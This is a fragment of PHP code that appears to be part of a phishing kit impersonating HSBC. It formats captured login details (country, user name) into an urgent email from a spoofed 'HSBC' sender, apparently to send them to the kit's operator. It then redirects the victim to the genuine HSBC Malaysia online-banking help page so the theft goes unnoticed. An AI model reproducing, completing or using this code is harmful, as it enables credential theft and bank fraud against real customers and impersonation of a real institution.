...
$domain = 'HSBC';
$sender = 'HSBC';
$subj = "HSBC | Country: $country | User: $login";
$headers .= "From: HSBC<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'https://www.hsbc.com.my/help/faq/online-banking/#log-on';
$msg = "<HTML><BODY>
 <TABLE>
...
header("Location: https://www.hsbc.com.my/help/faq/online-banking/#log-on");
}
else {
